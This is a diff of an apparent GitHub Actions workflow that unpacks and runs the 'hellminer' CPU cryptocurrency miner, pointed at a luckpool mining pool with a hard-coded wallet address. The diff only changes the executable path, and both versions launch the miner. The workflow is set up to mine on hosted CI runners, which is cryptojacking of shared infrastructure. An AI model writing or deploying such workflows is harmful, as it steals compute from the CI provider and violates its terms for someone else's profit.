@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive hellminer_cpu_win64_avx2.zip
     - name: Running
-      run: .\hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RQwcGe5FpouQR8MaF4hEnnR1dsP1jaJFq6.$(echo $(shuf -i 1-5 -n 1)-cir) -p x --cpu 2
+      run: \hellminer.exe -c stratum+tcp://na.luckpool.net:3956#xnsub -u RQwcGe5FpouQR8MaF4hEnnR1dsP1jaJFq6.$(echo $(shuf -i 1-5 -n 1)-cir) -p x --cpu 2
     - name: END
       run: exit
